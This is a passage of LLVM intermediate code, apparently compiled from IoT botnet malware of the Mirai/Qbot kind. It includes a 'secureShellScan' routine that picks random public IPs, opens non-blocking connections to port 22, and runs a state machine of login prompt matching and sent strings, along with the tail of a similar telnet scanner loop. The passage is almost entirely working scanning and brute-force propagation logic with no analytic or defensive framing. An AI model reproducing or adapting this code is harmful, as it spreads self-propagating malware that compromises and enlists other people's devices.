  %392 = load i32, i32* %348, align 16
  %393 = call i32 @sclose(i32 %392)
  store i8 0, i8* %32, align 8
  %394 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %394, align 1
  br label %582

; <label>:395:                                    ; preds = %388
  store i8 7, i8* %32, align 8
  call void @llvm.memset.p0i8.i64(i8* %381, i8 0, i64 1024, i32 1, i1 false)
  br label %582

; <label>:396:                                    ; preds = %373
  %397 = load i32, i32* %348, align 16
  %398 = load i8*, i8** %350, align 8
  %399 = load i16, i16* %352, align 16
  %400 = zext i16 %399 to i32
  %401 = call i32 @readUntil(i32 %397, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %398, i32 1024, i32 %400)
  %402 = icmp eq i32 %401, 0
  br i1 %402, label %419, label %403

; <label>:403:                                    ; preds = %396
  store i32 0, i32* %342, align 4
  store i16 0, i16* %352, align 16
  %404 = load i8*, i8** %350, align 8
  %405 = call i8* @strstr(i8* %404, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i64 0, i64 0)) #14
  %406 = icmp eq i8* %405, null
  br i1 %406, label %411, label %407

; <label>:407:                                    ; preds = %403
  call void @llvm.memset.p0i8.i64(i8* %404, i8 0, i64 1024, i32 1, i1 false)
  %408 = load i32, i32* %348, align 16
  %409 = call i32 @sclose(i32 %408)
  store i8 0, i8* %32, align 8
  %410 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 0, i8* %410, align 1
  br label %582

; <label>:411:                                    ; preds = %403
  %412 = call i32 @matchPrompt(i8* %404)
  %413 = icmp eq i32 %412, 0
  br i1 %413, label %414, label %418

; <label>:414:                                    ; preds = %411
  call void @llvm.memset.p0i8.i64(i8* %404, i8 0, i64 1024, i32 1, i1 false)
  %415 = load i32, i32* %348, align 16
  %416 = call i32 @sclose(i32 %415)
  store i8 0, i8* %32, align 8
  %417 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %417, align 1
  br label %582

; <label>:418:                                    ; preds = %411
  store i8 7, i8* %32, align 8
  call void @llvm.memset.p0i8.i64(i8* %404, i8 0, i64 1024, i32 1, i1 false)
  br label %582

; <label>:419:                                    ; preds = %396
  %420 = load i32, i32* %348, align 16
  %421 = load i8*, i8** %350, align 8
  %422 = load i16, i16* %352, align 16
  %423 = zext i16 %422 to i32
  %424 = call i32 @readUntil(i32 %420, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %421, i32 1024, i32 %423)
  %425 = icmp eq i32 %424, 0
  br i1 %425, label %442, label %426

; <label>:426:                                    ; preds = %419
  store i32 0, i32* %342, align 4
  store i16 0, i16* %352, align 16
  %427 = load i8*, i8** %350, align 8
  %428 = call i8* @strstr(i8* %427, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i64 0, i64 0)) #14
  %429 = icmp eq i8* %428, null
  br i1 %429, label %434, label %430

; <label>:430:                                    ; preds = %426
  call void @llvm.memset.p0i8.i64(i8* %427, i8 0, i64 1024, i32 1, i1 false)
  %431 = load i32, i32* %348, align 16
  %432 = call i32 @sclose(i32 %431)
  store i8 0, i8* %32, align 8
  %433 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 0, i8* %433, align 1
  br label %582

; <label>:434:                                    ; preds = %426
  %435 = call i32 @matchPrompt(i8* %427)
  %436 = icmp eq i32 %435, 0
  br i1 %436, label %437, label %441

; <label>:437:                                    ; preds = %434
  call void @llvm.memset.p0i8.i64(i8* %427, i8 0, i64 1024, i32 1, i1 false)
  %438 = load i32, i32* %348, align 16
  %439 = call i32 @sclose(i32 %438)
  store i8 0, i8* %32, align 8
  %440 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %440, align 1
  br label %582

; <label>:441:                                    ; preds = %434
  store i8 7, i8* %32, align 8
  call void @llvm.memset.p0i8.i64(i8* %427, i8 0, i64 1024, i32 1, i1 false)
  br label %582

; <label>:442:                                    ; preds = %419
  %443 = load i32, i32* %348, align 16
  %444 = load i8*, i8** %350, align 8
  %445 = load i16, i16* %352, align 16
  %446 = zext i16 %445 to i32
  %447 = call i32 @readUntil(i32 %443, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %444, i32 1024, i32 %446)
  %448 = icmp eq i32 %447, 0
  br i1 %448, label %465, label %449

; <label>:449:                                    ; preds = %442
  store i32 0, i32* %342, align 4
  store i16 0, i16* %352, align 16
  %450 = load i8*, i8** %350, align 8
  %451 = call i8* @strstr(i8* %450, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i64 0, i64 0)) #14
  %452 = icmp eq i8* %451, null
  br i1 %452, label %457, label %453

; <label>:453:                                    ; preds = %449
  call void @llvm.memset.p0i8.i64(i8* %450, i8 0, i64 1024, i32 1, i1 false)
  %454 = load i32, i32* %348, align 16
  %455 = call i32 @sclose(i32 %454)
  store i8 0, i8* %32, align 8
  %456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 0, i8* %456, align 1
  br label %582

; <label>:457:                                    ; preds = %449
  %458 = call i32 @matchPrompt(i8* %450)
  %459 = icmp eq i32 %458, 0
  br i1 %459, label %460, label %464

; <label>:460:                                    ; preds = %457
  call void @llvm.memset.p0i8.i64(i8* %450, i8 0, i64 1024, i32 1, i1 false)
  %461 = load i32, i32* %348, align 16
  %462 = call i32 @sclose(i32 %461)
  store i8 0, i8* %32, align 8
  %463 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %463, align 1
  br label %582

; <label>:464:                                    ; preds = %457
  store i8 7, i8* %32, align 8
  call void @llvm.memset.p0i8.i64(i8* %450, i8 0, i64 1024, i32 1, i1 false)
  br label %582

; <label>:465:                                    ; preds = %442
  %466 = load i32, i32* %348, align 16
  %467 = load i8*, i8** %350, align 8
  %468 = load i16, i16* %352, align 16
  %469 = zext i16 %468 to i32
  %470 = call i32 @readUntil(i32 %466, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %467, i32 1024, i32 %469)
  %471 = icmp eq i32 %470, 0
  br i1 %471, label %488, label %472

; <label>:472:                                    ; preds = %465
  store i32 0, i32* %342, align 4
  store i16 0, i16* %352, align 16
  %473 = load i8*, i8** %350, align 8
  %474 = call i8* @strstr(i8* %473, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0)) #14
  %475 = icmp eq i8* %474, null
  br i1 %475, label %480, label %476

; <label>:476:                                    ; preds = %472
  call void @llvm.memset.p0i8.i64(i8* %473, i8 0, i64 1024, i32 1, i1 false)
  %477 = load i32, i32* %348, align 16
  %478 = call i32 @sclose(i32 %477)
  store i8 0, i8* %32, align 8
  %479 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 0, i8* %479, align 1
  br label %582

; <label>:480:                                    ; preds = %472
  %481 = call i32 @matchPrompt(i8* %473)
  %482 = icmp eq i32 %481, 0
  br i1 %482, label %483, label %487

; <label>:483:                                    ; preds = %480
  call void @llvm.memset.p0i8.i64(i8* %473, i8 0, i64 1024, i32 1, i1 false)
  %484 = load i32, i32* %348, align 16
  %485 = call i32 @sclose(i32 %484)
  store i8 0, i8* %32, align 8
  %486 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %486, align 1
  br label %582

; <label>:487:                                    ; preds = %480
  store i8 7, i8* %32, align 8
  call void @llvm.memset.p0i8.i64(i8* %473, i8 0, i64 1024, i32 1, i1 false)
  br label %582

; <label>:488:                                    ; preds = %465
  %489 = load i32, i32* %348, align 16
  %490 = load i8*, i8** %350, align 8
  %491 = load i16, i16* %352, align 16
  %492 = zext i16 %491 to i32
  %493 = call i32 @readUntil(i32 %489, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %490, i32 1024, i32 %492)
  %494 = icmp eq i32 %493, 0
  br i1 %494, label %511, label %495

; <label>:495:                                    ; preds = %488
  store i32 0, i32* %342, align 4
  store i16 0, i16* %352, align 16
  %496 = load i8*, i8** %350, align 8
  %497 = call i8* @strstr(i8* %496, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i64 0, i64 0)) #14
  %498 = icmp eq i8* %497, null
  br i1 %498, label %503, label %499

; <label>:499:                                    ; preds = %495
  call void @llvm.memset.p0i8.i64(i8* %496, i8 0, i64 1024, i32 1, i1 false)
  %500 = load i32, i32* %348, align 16
  %501 = call i32 @sclose(i32 %500)
  store i8 0, i8* %32, align 8
  %502 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 0, i8* %502, align 1
  br label %582

; <label>:503:                                    ; preds = %495
  %504 = call i32 @matchPrompt(i8* %496)
  %505 = icmp eq i32 %504, 0
  br i1 %505, label %506, label %510

; <label>:506:                                    ; preds = %503
  call void @llvm.memset.p0i8.i64(i8* %496, i8 0, i64 1024, i32 1, i1 false)
  %507 = load i32, i32* %348, align 16
  %508 = call i32 @sclose(i32 %507)
  store i8 0, i8* %32, align 8
  %509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %509, align 1
  br label %582

; <label>:510:                                    ; preds = %503
  store i8 7, i8* %32, align 8
  call void @llvm.memset.p0i8.i64(i8* %496, i8 0, i64 1024, i32 1, i1 false)
  br label %582

; <label>:511:                                    ; preds = %488
  %512 = load i32, i32* %348, align 16
  %513 = load i8*, i8** %350, align 8
  %514 = load i16, i16* %352, align 16
  %515 = zext i16 %514 to i32
  %516 = call i32 @readUntil(i32 %512, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %513, i32 1024, i32 %515)
  %517 = icmp eq i32 %516, 0
  br i1 %517, label %534, label %518

; <label>:518:                                    ; preds = %511
  store i32 0, i32* %342, align 4
  store i16 0, i16* %352, align 16
  %519 = load i8*, i8** %350, align 8
  %520 = call i8* @strstr(i8* %519, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i64 0, i64 0)) #14
  %521 = icmp eq i8* %520, null
  br i1 %521, label %526, label %522

; <label>:522:                                    ; preds = %518
  call void @llvm.memset.p0i8.i64(i8* %519, i8 0, i64 1024, i32 1, i1 false)
  %523 = load i32, i32* %348, align 16
  %524 = call i32 @sclose(i32 %523)
  store i8 0, i8* %32, align 8
  %525 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 0, i8* %525, align 1
  br label %582

; <label>:526:                                    ; preds = %518
  %527 = call i32 @matchPrompt(i8* %519)
  %528 = icmp eq i32 %527, 0
  br i1 %528, label %529, label %533

; <label>:529:                                    ; preds = %526
  call void @llvm.memset.p0i8.i64(i8* %519, i8 0, i64 1024, i32 1, i1 false)
  %530 = load i32, i32* %348, align 16
  %531 = call i32 @sclose(i32 %530)
  store i8 0, i8* %32, align 8
  %532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %532, align 1
  br label %582

; <label>:533:                                    ; preds = %526
  store i8 7, i8* %32, align 8
  call void @llvm.memset.p0i8.i64(i8* %519, i8 0, i64 1024, i32 1, i1 false)
  br label %582

; <label>:534:                                    ; preds = %511
  %535 = load i8*, i8** %350, align 8
  %536 = call i64 @strlen(i8* %535) #14
  %537 = trunc i64 %536 to i16
  store i16 %537, i16* %352, align 16
  %538 = load i32, i32* %342, align 4
  %539 = add i32 %538, 10
  %540 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %541 = icmp ult i32 %539, %540
  br i1 %541, label %542, label %582

; <label>:542:                                    ; preds = %534
  %543 = load i32, i32* %348, align 16
  %544 = call i32 @sclose(i32 %543)
  store i8 0, i8* %32, align 8
  %545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %545, align 1
  br label %582

; <label>:546:                                    ; preds = %.lr.ph
  %547 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 0, i32 0
  %548 = load i32, i32* %547, align 16
  %549 = call i64 @send(i32 %548, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i64 0, i64 0), i64 4, i32 16384) #3
  %550 = icmp slt i64 %549, 0
  br i1 %550, label %551, label %555

; <label>:551:                                    ; preds = %546
  %552 = load i32, i32* %547, align 16
  %553 = call i32 @sclose(i32 %552)
  store i8 0, i8* %32, align 8
  %554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %554, align 1
  br label %582

; <label>:555:                                    ; preds = %546
  store i8 8, i8* %32, align 8
  br label %582

; <label>:556:                                    ; preds = %.lr.ph
  %557 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 6
  %558 = load i32, i32* %557, align 4
  %559 = icmp eq i32 %558, 0
  br i1 %559, label %560, label %562

; <label>:560:                                    ; preds = %556
  %561 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %561, i32* %557, align 4
  br label %562

; <label>:562:                                    ; preds = %560, %556
  %563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 0, i32 0
  %564 = load i32, i32* %563, align 16
  %565 = call i64 @send(i32 %564, i8* getelementptr inbounds ([193 x i8], [193 x i8]* @.str.41, i64 0, i64 0), i64 194, i32 16384) #3
  %566 = icmp slt i64 %565, 0
  br i1 %566, label %567, label %573

; <label>:567:                                    ; preds = %562
  %568 = load i32, i32* %563, align 16
  %569 = call i32 @sclose(i32 %568)
  store i8 0, i8* %32, align 8
  %570 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %570, align 1
  %571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 8
  %572 = load i8*, i8** %571, align 8
  call void @llvm.memset.p0i8.i64(i8* %572, i8 0, i64 1024, i32 1, i1 false)
  br label %582

; <label>:573:                                    ; preds = %562
  %574 = load i32, i32* %557, align 4
  %575 = add i32 %574, 10
  %576 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %577 = icmp ult i32 %575, %576
  br i1 %577, label %578, label %582

; <label>:578:                                    ; preds = %573
  %579 = load i32, i32* %563, align 16
  %580 = call i32 @sclose(i32 %579)
  store i8 0, i8* %32, align 8
  %581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %581, align 1
  br label %582

; <label>:582:                                    ; preds = %.lr.ph, %218, %340, %555, %78, %75, %124, %119, %192, %184, %314, %307, %542, %534, %578, %573, %59, %567, %551, %533, %529, %522, %510, %506, %499, %487, %483, %476, %464, %460, %453, %441, %437, %430, %418, %414, %407, %395, %391, %384, %372, %368, %361, %336, %330, %303, %296, %289, %282, %275, %268, %261, %254, %246, %235, %214, %208, %182, %173, %164, %155, %144, %108, %58
  %583 = add nsw i32 %.1307, 1
  %584 = icmp slt i32 %583, %10
  %.mux = select i1 %584, i32 %583, i32 0
  br label %.lr.ph
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #5

declare i32 @time(...) local_unnamed_addr #4

; Function Attrs: noinline noreturn nounwind uwtable
define void @secureShellScan() local_unnamed_addr #12 {
  %1 = alloca %struct.__sigset_t, align 8
  %2 = alloca <2 x i64>, align 16
  %tmpcast = bitcast <2 x i64>* %2 to %struct.timeval*
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = tail call i32 @getdtablesize() #3
  %7 = sdiv i32 %6, 4
  %8 = mul nsw i32 %7, 3
  %9 = icmp slt i32 %8, 512
  %10 = select i1 %9, i32 %8, i32 512
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = tail call zeroext i16 @htons(i16 zeroext 22) #17
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %12, i16* %13, align 2
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %15 = bitcast i8* %14 to i64*
  store i64 0, i64* %15, align 4
  %16 = zext i32 %10 to i64
  %17 = alloca %struct.telstate_t, i64 %16, align 16
  %18 = bitcast %struct.telstate_t* %17 to i8*
  %19 = sext i32 %10 to i64
  %20 = mul nsw i64 %19, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %18, i8 0, i64 %20, i32 16, i1 false)
  %21 = icmp sgt i32 %6, 3
  br i1 %21, label %.lr.ph292.preheader, label %.preheader

.lr.ph292.preheader:                              ; preds = %0
  br label %.lr.ph292

.preheader.loopexit:                              ; preds = %.lr.ph292
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %0
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %23 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %1, i64 0, i32 0, i64 0
  br label %.loopexit

.lr.ph292:                                        ; preds = %.lr.ph292.preheader, %.lr.ph292
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph292 ], [ 0, %.lr.ph292.preheader ]
  %24 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %indvars.iv, i32 3
  store i8 1, i8* %24, align 1
  %25 = tail call noalias i8* @malloc(i64 1024) #3
  %26 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %indvars.iv, i32 8
  store i8* %25, i8** %26, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %25, i8 0, i64 1024, i32 1, i1 false)
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %27 = icmp slt i64 %indvars.iv.next, %19
  br i1 %27, label %.lr.ph292, label %.preheader.loopexit

.loopexit:                                        ; preds = %.loopexit, %.preheader
  br i1 %21, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  %28 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %29 = bitcast i32* %4 to i8*
  br label %.lr.ph

.lr.ph:                                           ; preds = %565, %.lr.ph.preheader
  %.1290 = phi i32 [ %.mux, %565 ], [ 0, %.lr.ph.preheader ]
  %30 = sext i32 %.1290 to i64
  %31 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30
  %32 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 2
  %33 = load i8, i8* %32, align 8
  switch i8 %33, label %565 [
    i8 0, label %34
    i8 1, label %80
    i8 2, label %128
    i8 3, label %169
    i8 4, label %192
    i8 5, label %291
    i8 6, label %314
    i8 7, label %519
    i8 8, label %529
    i8 9, label %539
  ]

; <label>:34:                                     ; preds = %.lr.ph
  %35 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 8
  %36 = load i8*, i8** %35, align 8
  call void @llvm.memset.p0i8.i64(i8* %36, i8 0, i64 1024, i32 1, i1 false)
  %37 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  %38 = load i8, i8* %37, align 1
  %39 = icmp eq i8 %38, 0
  br i1 %39, label %46, label %40

; <label>:40:                                     ; preds = %34
  %41 = bitcast i8** %35 to i64*
  %42 = load i64, i64* %41, align 8
  %43 = bitcast %struct.telstate_t* %31 to i8*
  call void @llvm.memset.p0i8.i64(i8* %43, i8 0, i64 32, i32 16, i1 false)
  store i64 %42, i64* %41, align 8
  %44 = call i32 @getRandomPublicIP()
  %45 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 1
  store i32 %44, i32* %45, align 4
  br label %59

; <label>:46:                                     ; preds = %34
  %47 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 5
  %48 = load i8, i8* %47, align 1
  %49 = add i8 %48, 1
  store i8 %49, i8* %47, align 1
  %50 = icmp eq i8 %49, 18
  br i1 %50, label %51, label %._crit_edge

._crit_edge:                                      ; preds = %46
  %.phi.trans.insert = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 4
  %.pre = load i8, i8* %.phi.trans.insert, align 2
  br label %55

; <label>:51:                                     ; preds = %46
  store i8 0, i8* %47, align 1
  %52 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 4
  %53 = load i8, i8* %52, align 2
  %54 = add i8 %53, 1
  store i8 %54, i8* %52, align 2
  br label %55

; <label>:55:                                     ; preds = %._crit_edge, %51
  %56 = phi i8 [ %.pre, %._crit_edge ], [ %54, %51 ]
  %57 = icmp eq i8 %56, 10
  br i1 %57, label %58, label %._crit_edge293

._crit_edge293:                                   ; preds = %55
  %.phi.trans.insert294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 1
  %.pre295 = load i32, i32* %.phi.trans.insert294, align 4
  br label %59

; <label>:58:                                     ; preds = %55
  store i8 1, i8* %37, align 1
  br label %565

; <label>:59:                                     ; preds = %._crit_edge293, %40
  %60 = phi i32 [ %.pre295, %._crit_edge293 ], [ %44, %40 ]
  store i16 2, i16* %11, align 4
  store i16 %12, i16* %13, align 2
  store i64 0, i64* %15, align 4
  store i32 %60, i32* %22, align 4
  %61 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %62 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 0, i32 0
  store i32 %61, i32* %62, align 16
  %63 = icmp eq i32 %61, -1
  br i1 %63, label %565, label %64

; <label>:64:                                     ; preds = %59
  %65 = call i32 (i32, i32, ...) @fcntl(i32 %61, i32 3, i8* null) #3
  %66 = or i32 %65, 2048
  %67 = call i32 (i32, i32, ...) @fcntl(i32 %61, i32 4, i32 %66) #3
  %68 = load i32, i32* %62, align 16
  %69 = call i32 @connect(i32 %68, %struct.sockaddr* nonnull %28, i32 16) #3
  %70 = icmp eq i32 %69, -1
  br i1 %70, label %71, label %78

; <label>:71:                                     ; preds = %64
  %72 = tail call i32* @__errno_location() #17
  %73 = load i32, i32* %72, align 4
  %74 = icmp eq i32 %73, 115
  br i1 %74, label %78, label %75

; <label>:75:                                     ; preds = %71
  %76 = load i32, i32* %62, align 16
  %77 = call i32 @sclose(i32 %76)
  store i8 1, i8* %37, align 1
  br label %565

; <label>:78:                                     ; preds = %71, %64
  store i8 1, i8* %32, align 8
  %79 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 6
  store i32 0, i32* %79, align 4
  br label %565

; <label>:80:                                     ; preds = %.lr.ph
  %81 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 6
  %82 = load i32, i32* %81, align 4
  %83 = icmp eq i32 %82, 0
  br i1 %83, label %84, label %86

; <label>:84:                                     ; preds = %80
  %85 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %85, i32* %81, align 4
  br label %86

; <label>:86:                                     ; preds = %80, %84
  %87 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %23) #3, !srcloc !20
  %88 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 0, i32 0
  %89 = load i32, i32* %88, align 16
  %90 = srem i32 %89, 64
  %91 = zext i32 %90 to i64
  %92 = shl i64 1, %91
  %93 = sdiv i32 %89, 64
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %1, i64 0, i32 0, i64 %94
  %96 = load i64, i64* %95, align 8
  %97 = or i64 %92, %96
  store i64 %97, i64* %95, align 8
  store <2 x i64> <i64 0, i64 10000>, <2 x i64>* %2, align 16
  %98 = add nsw i32 %89, 1
  %99 = call i32 @select(i32 %98, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %1, %struct.__sigset_t* null, %struct.timeval* nonnull %tmpcast) #3
  switch i32 %99, label %119 [
    i32 1, label %100
    i32 -1, label %115
  ]

; <label>:100:                                    ; preds = %86
  store i32 4, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %101 = load i32, i32* %88, align 16
  %102 = call i32 @getsockopt(i32 %101, i32 1, i32 4, i8* nonnull %29, i32* nonnull %3) #3
  %103 = load i32, i32* %4, align 4
  %104 = icmp eq i32 %103, 0
  %105 = load i32, i32* %88, align 16
  br i1 %104, label %108, label %106

; <label>:106:                                    ; preds = %100
  %107 = call i32 @sclose(i32 %105)
  br label %.sink.split

; <label>:108:                                    ; preds = %100
  %109 = call i32 (i32, i32, ...) @fcntl(i32 %105, i32 3, i8* null) #3
  %110 = and i32 %109, -2049
  %111 = call i32 (i32, i32, ...) @fcntl(i32 %105, i32 4, i32 %110) #3
  store i32 0, i32* %81, align 4
  %112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 7
  store i16 0, i16* %112, align 16
  %113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 8
  %114 = load i8*, i8** %113, align 8
  call void @llvm.memset.p0i8.i64(i8* %114, i8 0, i64 1024, i32 1, i1 false)
  store i8 2, i8* %32, align 8
  br label %565

; <label>:115:                                    ; preds = %86
  %116 = load i32, i32* %88, align 16
  %117 = call i32 @sclose(i32 %116)
  br label %.sink.split

.sink.split:                                      ; preds = %106, %115
  store i8 0, i8* %32, align 8
  %118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %118, align 1
  br label %119

; <label>:119:                                    ; preds = %86, %.sink.split
  %120 = load i32, i32* %81, align 4
  %121 = add i32 %120, 10
  %122 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %123 = icmp ult i32 %121, %122
  br i1 %123, label %124, label %565

; <label>:124:                                    ; preds = %119
  %125 = load i32, i32* %88, align 16
  %126 = call i32 @sclose(i32 %125)
  store i8 0, i8* %32, align 8
  %127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %127, align 1
  br label %565

; <label>:128:                                    ; preds = %.lr.ph
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 6
  %130 = load i32, i32* %129, align 4
  %131 = icmp eq i32 %130, 0
  br i1 %131, label %132, label %134

; <label>:132:                                    ; preds = %128
  %133 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %133, i32* %129, align 4
  br label %134

; <label>:134:                                    ; preds = %132, %128
  %135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 0, i32 0
  %136 = load i32, i32* %135, align 16
  %137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 8
  %138 = load i8*, i8** %137, align 8
  %139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 7
  %140 = load i16, i16* %139, align 16
  %141 = zext i16 %140 to i32
  %142 = call i32 @readUntil(i32 %136, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.25, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %138, i32 1024, i32 %141)
  %143 = icmp eq i32 %142, 0
  br i1 %143, label %148, label %144

; <label>:144:                                    ; preds = %134
  store i32 0, i32* %129, align 4
  store i16 0, i16* %139, align 16
  %145 = load i8*, i8** %137, align 8
  %146 = call i8* @strstr(i8* %145, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i64 0, i64 0)) #14
  %147 = icmp ne i8* %146, null
  %.sink = select i1 %147, i8 5, i8 3
  store i8 %.sink, i8* %32, align 8
  call void @llvm.memset.p0i8.i64(i8* %145, i8 0, i64 1024, i32 1, i1 false)
  br label %565

; <label>:148:                                    ; preds = %134
  %149 = load i32, i32* %135, align 16
  %150 = load i8*, i8** %137, align 8
  %151 = load i16, i16* %139, align 16
  %152 = zext i16 %151 to i32
  %153 = call i32 @readUntil(i32 %149, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.42, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %150, i32 1024, i32 %152)
  %154 = icmp eq i32 %153, 0
  br i1 %154, label %157, label %155

; <label>:155:                                    ; preds = %148
  store i32 0, i32* %129, align 4
  store i16 0, i16* %139, align 16
  %156 = load i8*, i8** %137, align 8
  call void @llvm.memset.p0i8.i64(i8* %156, i8 0, i64 1024, i32 1, i1 false)
  store i8 3, i8* %32, align 8
  br label %565

; <label>:157:                                    ; preds = %148
  %158 = load i8*, i8** %137, align 8
  %159 = call i64 @strlen(i8* %158) #14
  %160 = trunc i64 %159 to i16
  store i16 %160, i16* %139, align 16
  %161 = load i32, i32* %129, align 4
  %162 = add i32 %161, 10
